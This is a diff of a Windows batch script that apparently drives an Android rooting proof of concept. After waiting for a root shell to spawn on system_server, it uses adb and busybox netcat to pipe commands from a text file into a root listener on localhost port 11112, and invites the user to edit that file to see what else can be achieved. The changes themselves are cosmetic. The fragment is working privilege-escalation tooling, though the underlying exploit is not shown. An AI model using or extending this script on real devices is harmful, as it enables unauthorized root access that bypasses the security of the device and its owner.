@@ -49,19 +49,18 @@ cls
 echo --------------------------------------------------------------------------------------------
 echo --------------------------------------------------------------------------------------------
 echo [*]WAITING 60 SECONDS FOR ROOT SHELL TO SPAWN
-timeout 60
+timeout 60 > nul
 echo --------------------------------------------------------------------------------------------
 echo [*] OPENING A ROOT SHELL ON THE NEWLY CREATED SYSTEM_SERVER
 echo [*] CREATE A NEW DIRECTORY AS A TEST
 echo [*] CHANGING PERMISSIONS ON NEW DIRECTORY
-echo [*] COPY shell FROM tmp TO test SO IT BECOMES OWNED  BY ROOT
+echo [*] COPY busybox FROM tmp TO test SO IT BECOMES OWNED  BY ROOT
 adb shell "/data/local/tmp/busybox nc localhost 11112 < /data/local/tmp/cp_comands.txt"
 echo [*]  
 echo --------------------------------------------------------------------------------------------
 echo --------------------------------------------------------------------------------------------
 echo [*] THERE WAS THE PROOF OF CONCEPT
 echo [*] NOW YOU CAN MODIFY THE cp_comands.txt AND START OVER TO SEE WHAT YOU CAN ACHIVE
-echo [*] NOW IF IT WENT CORRECT YOU CAN LAUNCH shell FORM test AND WILL BE A ROOT SHELL
 pause
 cls
 echo [*]  
